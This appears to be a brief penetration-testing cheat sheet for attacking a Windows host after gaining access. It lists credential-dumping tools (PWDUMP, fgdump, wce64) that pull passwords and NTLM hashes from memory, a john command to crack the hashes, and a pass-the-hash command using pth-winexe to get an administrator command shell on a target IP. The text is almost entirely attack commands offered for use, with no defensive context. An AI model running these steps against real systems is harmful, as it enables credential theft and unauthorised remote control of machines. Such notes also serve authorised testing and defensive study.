# Inside Windows host


## Password dumping
```
# In-memory dumps
PWDUMP

# Requires admin privileges
# Dumps Passwords/NTLM Hashes
fgdump.exe
```

```
# Windows Credentials Editor
# Steal Passwords/NTLM Hashes from memory
wce64.exe
```

## Crack NTLM Hashes
```bash
# Bruteforce mode
john <file>
```

## Passing the hash
```bash
# See all hashes
pth-*


export SMBHASH=<hash>
pth-winexe -U administrator% //<ip> cmd
```
